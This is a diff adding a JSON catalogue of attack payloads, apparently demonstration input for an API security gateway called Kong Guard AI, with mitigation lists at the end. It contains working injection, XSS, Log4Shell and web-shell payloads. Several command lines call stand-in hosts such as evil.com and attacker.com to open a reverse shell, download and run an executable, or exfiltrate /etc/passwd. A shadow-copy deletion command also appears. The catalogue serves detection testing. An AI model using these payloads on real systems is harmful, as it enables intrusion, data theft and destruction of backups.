@@ -1,0 +1,467 @@
+{
+  "metadata": {
+    "version": "1.0",
+    "description": "Enterprise-grade vicious attack patterns for Kong Guard AI demonstration",
+    "total_patterns": 65,
+    "categories": 12,
+    "severity_levels": ["CRITICAL", "HIGH", "MEDIUM"],
+    "last_updated": "2025-08-27"
+  },
+  "attack_categories": {
+    "advanced_sql_injection": {
+      "description": "Sophisticated SQL injection techniques used by advanced persistent threats",
+      "threat_level": "CRITICAL",
+      "patterns": [
+        {
+          "name": "Boolean-Based Blind SQL Injection",
+          "payload": "id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
+          "technique": "Inference-based data extraction",
+          "impact": "Complete database compromise"
+        },
+        {
+          "name": "Time-Based Blind SQL with Binary Search",
+          "payload": "id=1' AND IF((ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64),SLEEP(5),0)--",
+          "technique": "Binary search password extraction",
+          "impact": "Password theft, account takeover"
+        },
+        {
+          "name": "Error-Based SQL with XPATH Injection",
+          "payload": "id=1' AND (extractvalue(1,concat(0x7e,(SELECT version()),0x7e)))--",
+          "technique": "Error message data extraction",
+          "impact": "Database version disclosure, information leakage"
+        },
+        {
+          "name": "Second-Order SQL Injection",
+          "payload": "username=admin'; INSERT INTO backdoor (cmd) VALUES ('rm -rf /')--",
+          "technique": "Delayed execution via stored data",
+          "impact": "Persistent backdoor installation"
+        },
+        {
+          "name": "WAF Bypass with Encoding",
+          "payload": "id=1%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20null,concat(0x3a,user(),0x3a)--",
+          "technique": "URL encoding to bypass filters",
+          "impact": "WAF evasion, data extraction"
+        }
+      ]
+    },
+    "nosql_injection": {
+      "description": "NoSQL injection attacks targeting MongoDB, CouchDB, and other NoSQL databases",
+      "threat_level": "HIGH",
+      "patterns": [
+        {
+          "name": "MongoDB Authentication Bypass",
+          "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+          "technique": "Query operator manipulation",
+          "impact": "Authentication bypass"
+        },
+        {
+          "name": "MongoDB JavaScript Injection",
+          "payload": "{\"$where\": \"this.username == 'admin' || this.role == 'superuser'\"}",
+          "technique": "JavaScript code injection in $where",
+          "impact": "Privilege escalation"
+        },
+        {
+          "name": "CouchDB Map-Reduce Injection",
+          "payload": "function(doc){emit(doc._id, eval('require(\"child_process\").exec(\"nc -e /bin/sh attacker.com 4444\")'))}",
+          "technique": "Code injection in map functions",
+          "impact": "Remote code execution"
+        }
+      ]
+    },
+    "advanced_xss": {
+      "description": "Sophisticated cross-site scripting attacks including DOM-based and mutation XSS",
+      "threat_level": "CRITICAL",
+      "patterns": [
+        {
+          "name": "Polyglot XSS Payload",
+          "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
+          "technique": "Multi-context injection",
+          "impact": "Universal XSS in any HTML context"
+        },
+        {
+          "name": "DOM Clobbering Attack",
+          "payload": "<form id=x tabindex=1 onfocus=alert(1)><input id=attributes>",
+          "technique": "DOM property pollution",
+          "impact": "Client-side code execution"
+        },
+        {
+          "name": "Server-Side Template Injection",
+          "payload": "{{7*7}}{{config.items()}}{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+          "technique": "Template engine exploitation",
+          "impact": "Server-side code execution"
+        },
+        {
+          "name": "Mutation XSS (mXSS)",
+          "payload": "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
+          "technique": "Browser parsing mutation",
+          "impact": "Filter bypass, code execution"
+        },
+        {
+          "name": "CSP Bypass with JSONP",
+          "payload": "<script src=\"https://vulnerable-site.com/jsonp?callback=alert\"></script>",
+          "technique": "Content Security Policy bypass",
+          "impact": "CSP evasion, data theft"
+        }
+      ]
+    },
+    "command_injection": {
+      "description": "Remote code execution through command injection vulnerabilities",
+      "threat_level": "CRITICAL",
+      "patterns": [
+        {
+          "name": "Blind Command Injection with DNS",
+          "payload": "ping -c 1 $(whoami).$(hostname).attacker-dns.com",
+          "technique": "DNS exfiltration of command results",
+          "impact": "Information disclosure, persistence"
+        },
+        {
+          "name": "PowerShell Encoded Command",
+          "payload": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+          "technique": "Base64 encoded PowerShell execution",
+          "impact": "Antivirus evasion, remote access"
+        },
+        {
+          "name": "Living-off-the-Land (LOLBins)",
+          "payload": "certutil.exe -urlcache -split -f http://evil.com/shell.exe shell.exe && shell.exe",
+          "technique": "Legitimate binary abuse",
+          "impact": "Defense evasion, malware download"
+        },
+        {
+          "name": "Python Code Injection",
+          "payload": "__import__('os').system('curl http://evil.com/steal?data='+open('/etc/passwd').read())",
+          "technique": "Python import manipulation",
+          "impact": "File access, data exfiltration"
+        }
+      ]
+    },
+    "zero_day_exploits": {
+      "description": "Patterns mimicking recent zero-day vulnerabilities and novel attack vectors",
+      "threat_level": "CRITICAL",
+      "patterns": [
+        {
+          "name": "Log4Shell Exploitation (CVE-2021-44228)",
+          "payload": "${jndi:ldap://evil.com:1389/Exploit}",
+          "technique": "JNDI lookup injection",
+          "impact": "Remote code execution, full system compromise"
+        },
+        {
+          "name": "Spring4Shell RCE (CVE-2022-22965)",
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}runtime",
+          "technique": "Spring Framework property binding",
+          "impact": "Remote code execution on Spring applications"
+        },
+        {
+          "name": "Text4Shell (CVE-2022-42889)",
+          "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://evil.com/pwned')}",
+          "technique": "Apache Commons Text interpolation",
+          "impact": "Remote code execution through string substitution"
+        },
+        {
+          "name": "ProxyLogon Exchange Exploit",
+          "payload": "/autodiscover/autodiscover.json?@evil.com/&Email=administrator@victim.com",
+          "technique": "SSRF to backend authentication bypass",
+          "impact": "Full Exchange server compromise"
+        },
+        {
+          "name": "PrintNightmare RCE (CVE-2021-34527)",
+          "payload": "\\\\evil.com\\share\\malicious.dll",
+          "technique": "Windows Print Spooler exploitation",
+          "impact": "SYSTEM-level code execution"
+        }
+      ]
+    },
+    "business_logic": {
+      "description": "Attacks targeting application-specific business logic flaws",
+      "threat_level": "HIGH",
+      "patterns": [
+        {
+          "name": "Race Condition Price Manipulation",
+          "payload": "{\"product_id\": 12345, \"quantity\": 1000, \"price_override\": 0.01}",
+          "technique": "Concurrent request timing",
+          "impact": "Financial fraud, inventory theft"
+        },
+        {
+          "name": "Integer Overflow Account Balance",
+          "payload": "{\"amount\": 9223372036854775807, \"operation\": \"add\"}",
+          "technique": "Maximum integer value exploitation",
+          "impact": "Unlimited account balance"
+        },
+        {
+          "name": "Negative Amount Transfer",
+          "payload": "{\"from\": \"victim_account\", \"to\": \"attacker_account\", \"amount\": -1000000}",
+          "technique": "Negative value processing flaw",
+          "impact": "Unauthorized money transfer"
+        },
+        {
+          "name": "Workflow State Manipulation",
+          "payload": "{\"order_status\": \"shipped\", \"payment_status\": \"pending\"}",
+          "technique": "State transition bypass",
+          "impact": "Free goods, service bypass"
+        },
+        {
+          "name": "Time-of-Check Time-of-Use (TOCTOU)",
+          "payload": "Rapid succession of validation and modification requests",
+          "technique": "Resource state change between validation and use",
+          "impact": "Authorization bypass, data corruption"
+        }
+      ]
+    },
+    "api_attacks": {
+      "description": "Modern API-specific attack vectors including GraphQL and JWT manipulation",
+      "threat_level": "HIGH",
+      "patterns": [
+        {
+          "name": "JWT Algorithm Confusion",
+          "payload": "{\"alg\": \"none\", \"typ\": \"JWT\"}.{\"sub\": \"admin\", \"exp\": 9999999999}.",
+          "technique": "Algorithm type manipulation",
+          "impact": "Authentication bypass, privilege escalation"
+        },
+        {
+          "name": "GraphQL Depth Attack",
+          "payload": "query { user { posts { comments { author { posts { comments { ... }}}}}}}",
+          "technique": "Recursive query depth explosion",
+          "impact": "Denial of service, resource exhaustion"
+        },
+        {
+          "name": "GraphQL Field Suggestion Attack",
+          "payload": "query { user { __schema { types { fields { name type }}}}}",
+          "technique": "Schema introspection abuse",
+          "impact": "API structure disclosure"
+        },
+        {
+          "name": "REST API Method Confusion",
+          "payload": "POST /api/users/123 with DELETE semantics in body",
+          "technique": "HTTP method override abuse",
+          "impact": "Unintended operation execution"
+        },
+        {
+          "name": "Mass Assignment Attack",
+          "payload": "{\"name\": \"John\", \"email\": \"john@example.com\", \"is_admin\": true, \"role\": \"superuser\"}",
+          "technique": "Additional parameter injection",
+          "impact": "Privilege escalation, data modification"
+        }
+      ]
+    },
+    "file_upload_attacks": {
+      "description": "Malicious file upload and processing exploitation",
+      "threat_level": "HIGH",
+      "patterns": [
+        {
+          "name": "XML External Entity (XXE) Attack",
+          "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+          "technique": "XML entity reference exploitation",
+          "impact": "File disclosure, SSRF"
+        },
+        {
+          "name": "Path Traversal File Upload",
+          "payload": "filename=../../../../var/www/html/shell.php",
+          "technique": "Directory traversal in filename",
+          "impact": "Arbitrary file write, web shell upload"
+        },
+        {
+          "name": "Polyglot File Upload",
+          "payload": "GIF89a<?php system($_GET['cmd']); ?>",
+          "technique": "Multi-format file header",
+          "impact": "Filter bypass, code execution"
+        },
+        {
+          "name": "Archive Bomb (Zip Bomb)",
+          "payload": "42.zip (42KB -> 4.5PB when extracted)",
+          "technique": "Compression ratio exploitation",
+          "impact": "Denial of service, resource exhaustion"
+        }
+      ]
+    },
+    "session_attacks": {
+      "description": "Session management and authentication bypass techniques",
+      "threat_level": "HIGH",
+      "patterns": [
+        {
+          "name": "Session Fixation Attack",
+          "payload": "Set-Cookie: PHPSESSID=attacker_controlled_session_id",
+          "technique": "Pre-established session identifier",
+          "impact": "Account hijacking"
+        },
+        {
+          "name": "JWT Token Replay",
+          "payload": "Reuse of valid JWT token beyond expiration through clock skew",
+          "technique": "Time-based token validation bypass",
+          "impact": "Unauthorized access extension"
+        },
+        {
+          "name": "SAML Response Manipulation",
+          "payload": "Modified SAML assertion with elevated privileges",
+          "technique": "XML signature wrapping",
+          "impact": "Single sign-on bypass, privilege escalation"
+        },
+        {
+          "name": "OAuth State Parameter Abuse",
+          "payload": "state=javascript:alert(document.domain)",
+          "technique": "State parameter injection",
+          "impact": "XSS via OAuth flow"
+        }
+      ]
+    },
+    "ransomware_indicators": {
+      "description": "Attack patterns associated with ransomware deployment and operation",
+      "threat_level": "CRITICAL",
+      "patterns": [
+        {
+          "name": "C2 Communication Pattern",
+          "payload": "{\"host_id\": \"VICTIM-001\", \"status\": \"encrypted\", \"btc_wallet\": \"1ABC...\"}",
+          "technique": "Command and control communication",
+          "impact": "Ransomware coordination, payment demands"
+        },
+        {
+          "name": "Lateral Movement Enumeration",
+          "payload": "net view /domain && nltest /domain_trusts",
+          "technique": "Active Directory reconnaissance",
+          "impact": "Network mapping, privilege escalation"
+        },
+        {
+          "name": "Shadow Copy Deletion",
+          "payload": "vssadmin delete shadows /all /quiet",
+          "technique": "Backup destruction",
+          "impact": "Recovery prevention"
+        },
+        {
+          "name": "Service Enumeration",
+          "payload": "sc query type=service state=all | findstr SERVICE_NAME",
+          "technique": "Service discovery for termination",
+          "impact": "Database/backup service disruption"
+        }
+      ]
+    },
+    "supply_chain": {
+      "description": "Software supply chain and dependency attacks",
+      "threat_level": "MEDIUM",
+      "patterns": [
+        {
+          "name": "Dependency Confusion",
+          "payload": "Package: internal-company-lib-v99.99.99 from public registry",
+          "technique": "Version number inflation",
+          "impact": "Malicious package installation"
+        },
+        {
+          "name": "Typosquatting Attack",
+          "payload": "npm install requets (instead of requests)",
+          "technique": "Misspelled package names",
+          "impact": "Unintended malicious package installation"
+        },
+        {
+          "name": "Package Substitution",
+          "payload": "Legitimate package name with malicious code injection",
+          "technique": "Repository compromise",
+          "impact": "Widespread malware distribution"
+        },
+        {
+          "name": "Build System Injection",
+          "payload": "Malicious code in package.json postinstall scripts",
+          "technique": "Installation hook abuse",
+          "impact": "Development environment compromise"
+        }
+      ]
+    },
+    "industry_specific": {
+      "financial": {
+        "description": "Attacks specifically targeting financial services",
+        "patterns": [
+          {
+            "name": "Wire Transfer Manipulation",
+            "payload": "{\"amount\": 1000000, \"recipient\": \"attacker_account\", \"memo\": \"legitimate_transfer\"}",
+            "impact": "Financial theft"
+          },
+          {
+            "name": "Credit Score Manipulation",
+            "payload": "{\"ssn\": \"123-45-6789\", \"new_score\": 850, \"reason\": \"correction\"}",
+            "impact": "Credit fraud"
+          }
+        ]
+      },
+      "healthcare": {
+        "description": "Attacks targeting healthcare systems and HIPAA-protected data",
+        "patterns": [
+          {
+            "name": "Patient Record Access",
+            "payload": "SELECT * FROM patients WHERE ssn LIKE '%'",
+            "impact": "HIPAA violation, identity theft"
+          },
+          {
+            "name": "Medical Device Manipulation",
+            "payload": "Insulin pump dosage modification commands",
+            "impact": "Life-threatening medical device compromise"
+          }
+        ]
+      },
+      "retail": {
+        "description": "E-commerce and retail-specific attack patterns",
+        "patterns": [
+          {
+            "name": "Price Manipulation",
+            "payload": "{\"product_id\": \"LUXURY_ITEM\", \"price\": 0.01}",
+            "impact": "Revenue loss, inventory theft"
+          },
+          {
+            "name": "Inventory Exhaustion",
+            "payload": "{\"product_id\": \"POPULAR_ITEM\", \"quantity\": 999999}",
+            "impact": "Stock manipulation, competitor advantage"
+          }
+        ]
+      }
+    }
+  },
+  "threat_intelligence": {
+    "common_attack_sources": {
+      "tor_exit_nodes": ["185.220.100.240", "199.87.154.255", "95.216.107.148"],
+      "known_botnets": ["198.51.100.123", "203.0.113.42", "141.98.80.15"],
+      "c2_infrastructure": ["46.161.40.127", "5.188.10.95", "185.220.102.8"],
+      "compromised_corporate": ["10.0.0.50", "172.16.0.25", "192.168.100.200"]
+    },
+    "user_agents": {
+      "malicious": [
+        "sqlmap/1.7.2#stable",
+        "XSSHunter/1.0", 
+        "JWTTool/1.0",
+        "AttackBot/1.0",
+        "GraphQL-Attacker/1.0"
+      ],
+      "suspicious": [
+        "curl/7.68.0",
+        "python-requests/2.28.1",
+        "PostmanRuntime/7.29.0"
+      ]
+    },
+    "attack_timing_patterns": {
+      "credential_stuffing": "High volume, short bursts",
+      "sql_injection": "Medium frequency, persistent",
+      "ddos": "Very high volume, sustained",
+      "ransomware": "Low frequency, targeted timing"
+    }
+  },
+  "mitigation_strategies": {
+    "sql_injection": [
+      "Parameterized queries/prepared statements",
+      "Input validation and sanitization",
+      "WAF with SQL injection rules",
+      "Database user privilege minimization"
+    ],
+    "xss": [
+      "Content Security Policy (CSP)",
+      "Input/output encoding",
+      "DOM-based XSS prevention",
+      "Template engine auto-escaping"
+    ],
+    "command_injection": [
+      "Input validation/whitelisting",
+      "Command parameterization",
+      "Sandboxing/containerization", 
+      "Principle of least privilege"
+    ],
+    "zero_day": [
+      "Behavioral analysis",
+      "Anomaly detection",
+      "AI-powered pattern recognition",
+      "Real-time threat intelligence"
+    ]
+  }
+}
